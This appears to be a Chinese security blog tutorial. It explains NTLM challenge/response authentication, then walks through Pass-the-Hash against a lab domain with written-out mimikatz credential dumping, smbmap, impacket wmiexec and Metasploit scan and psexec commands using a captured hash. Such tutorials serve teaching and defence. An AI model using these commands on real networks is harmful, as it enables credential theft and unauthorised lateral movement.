---
title: "NTLM 认证协议到 Pass The Hash 攻击"
slug: ntlm-authentication-to-pth-attack
aliases: ["/2020/ntlm-authentication-to-pth-attack.html"]
date: 2020-08-25 12:50:05
categories: ["网络安全"]
tags: ["Windows", "网络认证", "域", "NTLM", "PTH"]
toc: true
draft: false
---

NTLM 是一种网络认证协议，与 NTLM Hash 的关系就是：NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。

## 0x01 NTLM 协议

> In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. NTLM is the successor to the authentication protocol in Microsoft LAN Manager (LANMAN), an older Microsoft product. The NTLM protocol suite is implemented in a Security Support Provider, which combines the LAN Manager authentication protocol, NTLMv1, NTLMv2 and NTLM2 Session protocols in a single package. Whether these protocols are used or can be used on a system is governed by Group Policy settings, for which different versions of Windows have different default settings. NTLM passwords are considered weak because they can be brute-forced very easily with modern hardware.

这段话摘自：

<https://en.wikipedia.org/wiki/NT_LAN_Manager>

大概说到 `NTLM` 协议是 `LM`（LAN Manager）协议的后继产品，其协议套件中包含 `LM` 、 `NTLM v1` 、 `NTLM v2` 和 `NTLM2 Session` 四种协议，具体该使用哪一种由组策略决定。不同版本的 `Windows` 版本具有不同的默认设置。其中也提到了 `NTLM` 协议是一种不安全的认证模式。

`NTLM` 基于 `Challenge/Response`（质询/响应）认证机制。整个认证流程分为三部分： `协商` ， `质询` 和 `身份验证` 。

### 1. 协商

客户端向服务器发送协商消息，此消息允许客户端向服务器指定其支持的 `NTLM` 选项，其中就包括需要登陆的用户名，协议版本信息，签名等等。可详见官方文档[NEGOTIATE_MESSAGE](https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2)

### 2. 质询

这一个过程中服务器接收到了客户端的协商信息，服务器会产生一个 `Challenge` ，之后加密验证会依赖于 `Challenge` 。

> **challenge**: A piece of data used to authenticate a user. Typically a challenge takes the form of a [nonce](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/780943e9-42e6-4dbe-aa87-1dce828ba82a#gt_001c0e40-0980-417d-853c-f7cb34ba6d3b).

这是来自微软官方的解释，就是说 `Challenge` 是用于验证用户身份的一条数据。通常， `Challenge` 采用随机数的形式。

```
NTLM v1 这里生成的是 8 位的 Challenge，而 NTLM v2 是 16 位的 Challenge。
```

服务器使用登录用户名对应的 `NTLM Hash` 加密 `Challenge` ， 得到一个 `Net NTLM Hash` 。同时将之前生成的随机数 `Challenge` 等信息发送给客户端。

客户端接受到 `Challenge` 后，使用将要登录到账户对应的 `NTLM Hash` 加密 `Challenge` 生成 `Response` ，然后将 `Response` 等信息发送至服务器端。

```
NTLM v1 这里的加密算法采用 DES，NTLM v2 采用 HMAC-MD5。
```

### 3. 身份验证

服务器端接收到客户端发送的 `Response` ，将 `Response` 与自己计算得出的 `Net NTLM Hash` 进行比较，如果相等，则认证通过。

![1](https://oss.zjun.info/zjun.info/20210607093842.png)

## 0x02 Pass The Hash 攻击

### 1. 原理

前面说到了 `Windows` 的网络认证，依靠 `NTLM` 协议，是一种点对点的认证交互模式，没有类似于 `Kerberos` 协议的信托机构。

并且在验证过程中也是没有使用到明文密码的，可以发现在客户端向服务端发起身份验证中主要的认证步骤在于向服务端发送 `Response` ，这意味着在某一种情况下，你在工作组或域环境中拿到了一台主机的权限，并读到了它的 `NTLM hash` 或 `LM hash` ，这时想要破解出明文密码可能会有难度，所以你选择依靠这个 `hash` ，在工作组或域内登陆更多的主机，因为在内网，密码一致的情况非常常见。

所以你可以伪装成客户端向服务端发起 `NTLM` 协议的认证，通过服务端对客户端发送的 `Challenge` 再加上你得到的 `hash` ，生成一个 `Response` ，就可以完整实现整个认证流程。

这个攻击方式就称为哈希传递（Pass The Hash）。

### 2. 攻击利用

下面介绍几种利用方式

#### Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
```

![2](https://oss.zjun.info/zjun.info/2.png)

利用当前的 `NTLM hash` 进行传递：

```bash
sekurlsa::pth /user:administrator /domain:zjun.com /ntlm:79c89e2e7418467a4e7b55f8307260ca
```

![3](https://oss.zjun.info/zjun.info/3.png)

#### Smbmap

[SMBMap](https://github.com/ShawnDEvans/smbmap)是一个 `SMB` 枚举工具，功能很强大，可以命令执行，同时也支持哈希传递。

```bash
python3 smbmap.py -u administrator -p '00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca' -H 192.168.21.200 -r 'C$\Users'
# 前面的 32 个 0 表示的是 LM hash，但是目标主机是 win 2012 默认不开启 LM hash，所以这里随意填入 32 位长度的字符即可。
```

![4](https://oss.zjun.info/zjun.info/4.png)

#### Wmiexec

python 源码：

<https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py>

```bash
python3 wmiexec.py -hashes 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca ZJUN/administrator@192.168.21.200 "whoami"
# 前面的 32 个 0 表示的是 LM hash，但是目标主机是 win 2012 默认不开启 LM hash，所以这里随意填入 32 位长度的字符即可。
```

![5](https://oss.zjun.info/zjun.info/5.png)

`windows exe` 版本：

<https://github.com/maaaaz/impacket-examples-windows>

![6](https://oss.zjun.info/zjun.info/6.png)

#### Metasploit psexec 模块

直接 `hash` 喷射整个内网段不免缓慢，由于其依赖于 `445` 或 `139` 等端口，所以可以先扫一下段内端口开放主机。

```bash
use auxiliary/scanner/smb/smb_version
set rhosts 192.168.21.0/24
set threads 100
run
```

![7](https://oss.zjun.info/zjun.info/7.png)

再利用 `psexec` 模块进行哈希传递。

```bash
use exploit/windows/smb/psexec
set lhost 192.168.0.102
set rhosts 192.168.21.200
set smbuser administrator
set smbpass 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca
run
```

![8](https://oss.zjun.info/zjun.info/8.png)

此外还有如[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)、[smbexec](https://github.com/brav0hax/smbexec)等工具。

对于这一缺陷，微软发布了 `KB2871997` 补丁，在打了该补丁后，对于 `SID` 非 `500` 的账户，无论用户名， `Pass The Hash` 无法成功。

```bash
wmic useraccount get name,sid
```

![9](https://oss.zjun.info/zjun.info/9.png)
